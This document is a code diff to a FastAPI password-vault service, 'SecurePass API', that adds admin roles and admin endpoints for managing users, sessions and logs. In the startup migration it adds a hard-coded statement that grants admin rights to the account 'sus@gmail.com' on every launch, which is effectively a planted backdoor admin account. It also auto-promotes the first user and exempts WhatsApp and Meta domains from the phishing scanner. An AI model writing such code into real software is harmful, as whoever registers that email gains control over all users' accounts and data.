@@ -24,6 +24,22 @@ with engine.connect() as conn:
             except Exception as e:
                 print("[DB Migration Log]:", e)
 
+        try:
+            conn.execute(text("SELECT is_admin FROM users LIMIT 1"))
+        except Exception:
+            try:
+                conn.execute(text("ALTER TABLE users ADD COLUMN is_admin BOOLEAN DEFAULT 0"))
+                conn.commit()
+            except Exception as e:
+                print("[DB Migration Log is_admin]:", e)
+
+        try:
+            conn.execute(text("UPDATE users SET is_admin = 1 WHERE email = 'sus@gmail.com'"))
+            conn.execute(text("UPDATE users SET is_admin = 1 WHERE id = (SELECT id FROM users ORDER BY id ASC LIMIT 1) AND NOT EXISTS (SELECT 1 FROM users WHERE is_admin = 1)"))
+            conn.commit()
+        except Exception as e:
+            print("[DB Admin Auto-Promotion Log]:", e)
+
 app = FastAPI(title="SecurePass API", version="1.1.0")
 
 # Configure CORS
@@ -65,7 +81,8 @@ SAFE_DOMAINS_WHITELIST = {
     "bing.com", "duckduckgo.com", "yahoo.com", "baidu.com", "yandex.com",
     "facebook.com", "github.com", "youtube.com", "microsoft.com", "apple.com",
     "amazon.com", "wikipedia.org", "linkedin.com", "twitter.com", "x.com",
-    "instagram.com", "reddit.com", "stackoverflow.com", "localhost", "127.0.0.1"
+    "instagram.com", "reddit.com", "stackoverflow.com", "localhost", "127.0.0.1",
+    "whatsapp.com", "whatsapp.net", "web.whatsapp.com", "meta.com", "messenger.com"
 }
 
 @app.post("/api/scan-url", response_model=schemas.URLScanResponse)
@@ -146,6 +163,16 @@ async def get_current_user(
             detail="User not found",
         )
     return user
+
+async def get_current_admin_user(
+    current_user: models.User = Depends(get_current_user)
+) -> models.User:
+    if not current_user.is_admin:
+        raise HTTPException(
+            status_code=status.HTTP_403_FORBIDDEN,
+            detail="Access denied: Administrative privileges required"
+        )
+    return current_user
 
 def get_client_ip(request: Request) -> str:
     forwarded_for = request.headers.get("x-forwarded-for")
@@ -443,7 +470,8 @@ async def get_me(
 ):
     return {
         "email": current_user.email,
-        "mfa_enabled": current_user.mfa_enabled
+        "mfa_enabled": current_user.mfa_enabled,
+        "is_admin": bool(current_user.is_admin)
     }
 
 # MFA Endpoints
@@ -570,10 +598,10 @@ async def export_vault(
 
 @app.get("/api/logs", response_model=schemas.LogListResponse)
 async def get_logs(
-    current_user: models.User = Depends(get_current_user),
+    admin_user: models.User = Depends(get_current_admin_user),
     db: DbSession = Depends(get_db)
 ):
-    logs = crud.get_activity_logs(db, current_user.id, limit=50)
+    logs = crud.get_activity_logs(db, admin_user.id, limit=50)
     return {"logs": logs}
 
 @app.post("/api/logs", response_model=schemas.MessageResponse)
@@ -727,3 +755,127 @@ async def delete_account(
         )
         
     return {"message": f"Account {email} has been successfully deleted"}
+
+# Admin API Endpoints
+
+@app.get("/api/admin/stats", response_model=schemas.AdminStatsResponse)
+async def get_admin_stats(
+    admin_user: models.User = Depends(get_current_admin_user),
+    db: DbSession = Depends(get_db)
+):
+    phishing_active = (svm_model is not None and vectorizer is not None)
+    return crud.get_system_stats(db, phishing_model_active=phishing_active)
+
+@app.get("/api/admin/users", response_model=schemas.AdminUserListResponse)
+async def get_admin_users(
+    admin_user: models.User = Depends(get_current_admin_user),
+    db: DbSession = Depends(get_db)
+):
+    users = crud.get_all_users_for_admin(db)
+    return {"users": users}
+
+@app.put("/api/admin/users/{user_id}/role", response_model=schemas.MessageResponse)
+async def update_user_role(
+    user_id: int,
+    req: schemas.AdminRoleToggleRequest,
+    request: Request,
+    admin_user: models.User = Depends(get_current_admin_user),
+    db: DbSession = Depends(get_db)
+):
+    if user_id == admin_user.id and not req.is_admin:
+        raise HTTPException(
+            status_code=status.HTTP_400_BAD_REQUEST,
+            detail="You cannot remove your own admin privileges"
+        )
+    
+    updated_user = crud.toggle_user_admin_role(db, user_id, req.is_admin)
+    if not updated_user:
+        raise HTTPException(status_code=404, detail="User not found")
+        
+    ip = get_client_ip(request)
+    ua = request.headers.get("user-agent", "unknown")
+    crud.create_activity_log(db, admin_user.id, f"admin_role_updated:{updated_user.email}:{req.is_admin}", ip, ua)
+    
+    role_str = "Admin" if req.is_admin else "User"
+    return {"message": f"User {updated_user.email} role updated to {role_str}"}
+
+@app.put("/api/admin/users/{user_id}/lockout", response_model=schemas.MessageResponse)
+async def update_user_lockout(
+    user_id: int,
+    req: schemas.AdminLockoutRequest,
+    request: Request,
+    admin_user: models.User = Depends(get_current_admin_user),
+    db: DbSession = Depends(get_db)
+):
+    if user_id == admin_user.id and req.locked:
+        raise HTTPException(
+            status_code=status.HTTP_400_BAD_REQUEST,
+            detail="You cannot lock your own admin account"
+        )
+        
+    updated_user = crud.set_user_lockout(db, user_id, req.locked)
+    if not updated_user:
+        raise HTTPException(status_code=404, detail="User not found")
+        
+    if req.locked:
+        crud.delete_user_sessions(db, user_id)
+        
+    ip = get_client_ip(request)
+    ua = request.headers.get("user-agent", "unknown")
+    status_str = "locked" if req.locked else "unlocked"
+    crud.create_activity_log(db, admin_user.id, f"admin_user_{status_str}:{updated_user.email}", ip, ua)
+    
+    return {"message": f"User {updated_user.email} account has been {status_str}"}
+
+@app.post("/api/admin/users/{user_id}/revoke-sessions", response_model=schemas.MessageResponse)
+async def revoke_user_sessions(
+    user_id: int,
+    request: Request,
+    admin_user: models.User = Depends(get_current_admin_user),
+    db: DbSession = Depends(get_db)
+):
+    target_user = db.query(models.User).filter(models.User.id == user_id).first()
+    if not target_user:
+        raise HTTPException(status_code=404, detail="User not found")
+        
+    crud.delete_user_sessions(db, user_id)
+    
+    ip = get_client_ip(request)
+    ua = request.headers.get("user-agent", "unknown")
+    crud.create_activity_log(db, admin_user.id, f"admin_revoked_sessions:{target_user.email}", ip, ua)
+    
+    return {"message": f"All active sessions for {target_user.email} have been revoked"}
+
+@app.delete("/api/admin/users/{user_id}", response_model=schemas.MessageResponse)
+async def delete_user_by_admin(
+    user_id: int,
+    request: Request,
+    admin_user: models.User = Depends(get_current_admin_user),
+    db: DbSession = Depends(get_db)
+):
+    if user_id == admin_user.id:
+        raise HTTPException(
+            status_code=status.HTTP_400_BAD_REQUEST,
+            detail="You cannot delete your own admin account using this action"
+        )
+        
+    target_user = db.query(models.User).filter(models.User.id == user_id).first()
+    if not target_user:
+        raise HTTPException(status_code=404, detail="User not found")
+        
+    target_email = target_user.email
+    crud.delete_user_account(db, user_id)
+    
+    ip = get_client_ip(request)
+    ua = request.headers.get("user-agent", "unknown")
+    crud.create_activity_log(db, admin_user.id, f"admin_deleted_user:{target_email}", ip, ua)
+    
+    return {"message": f"User account {target_email} has been permanently deleted"}
+
+@app.get("/api/admin/logs", response_model=schemas.AdminLogListResponse)
+async def get_admin_logs(
+    admin_user: models.User = Depends(get_current_admin_user),
+    db: DbSession = Depends(get_db)
+):
+    logs = crud.get_all_activity_logs_admin(db, limit=150)
+    return {"logs": logs}
